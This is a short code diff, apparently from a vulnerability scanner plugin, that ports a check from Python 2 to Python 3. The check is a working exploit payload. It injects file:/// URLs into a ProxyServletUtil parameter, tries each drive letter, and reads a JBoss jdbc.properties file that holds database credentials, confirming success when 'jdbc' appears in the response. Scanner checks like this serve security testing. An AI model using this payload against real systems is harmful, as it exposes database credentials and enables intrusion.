@@ -12,8 +12,8 @@ def audit(arg):
     code, head, res, errcode, _ = curl.curl2(arg+url)
     if code == 500:
         #a-z遍历
-        for fuzz in xrange(0x41, 0x5B):
-            payload = 'ProxyServletUtil?url=file:///'+unichr(fuzz)+':/FE/jboss/server/default/deploy/fe.war/WEB-INF/classes/jdbc.properties'
+        for fuzz in range(0x41, 0x5B):
+            payload = 'ProxyServletUtil?url=file:///'+chr(fuzz)+':/FE/jboss/server/default/deploy/fe.war/WEB-INF/classes/jdbc.properties'
             code, head, res, errcode, _ = curl.curl2(arg+payload)
             #print unichr(fuzz)
             if code == 200 and 'jdbc' in res:
